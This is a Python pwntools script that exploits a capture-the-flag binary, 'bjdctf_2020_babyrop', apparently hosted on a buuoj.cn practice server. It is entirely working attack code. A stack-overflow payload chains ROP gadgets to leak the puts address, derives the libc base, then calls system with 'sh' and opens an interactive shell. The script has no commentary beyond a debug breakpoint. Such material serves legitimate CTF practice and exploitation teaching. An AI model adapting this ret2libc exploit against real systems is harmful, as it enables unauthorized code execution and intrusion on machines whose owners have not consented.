from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6_2.23-0ubuntu11_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 26437

elf = ELF("./bjdctf_2020_babyrop")

gadgets = {
        "ret" : 0x00000000004004c9,
        "pop_rdi_ret" : 0x0000000000400733,
        "pop_rsi_pop_r15_ret" : 0x0000000000400731,
        }

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *0x4006a5
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def attack():
    payload = b"A" * 0x20
    payload += p64(gadgets["ret"])
    payload += p64(gadgets["pop_rdi_ret"])
    payload += p64(elf.got["puts"])
    payload += p64(elf.plt["puts"])
    payload += p64(elf.sym["_start"])
    sock.sendafter(b"Pull up your sword and tell me u story!\n", payload)
    addr_puts_got = u64(sock.recvline()[:-1].ljust(8,b"\x00"))
    log.success("addr_puts_got = " + hex(addr_puts_got))
    addr_libc_base = addr_puts_got - libc.sym["puts"]
    log.success("addr_libc_base = " + hex(addr_libc_base))

    addr_system = addr_libc_base + libc.sym["system"]
    addr_sh_str = addr_libc_base + next(libc.search(b"sh\x00"))

    payload = b"A" * 0x20
    payload += p64(gadgets["ret"])
    payload += p64(gadgets["pop_rdi_ret"])
    payload += p64(addr_sh_str)
    payload += p64(addr_system)
    sock.sendafter(b"Pull up your sword and tell me u story!\n", payload)

if __name__ == "__main__":
    attack()
    sock.interactive()



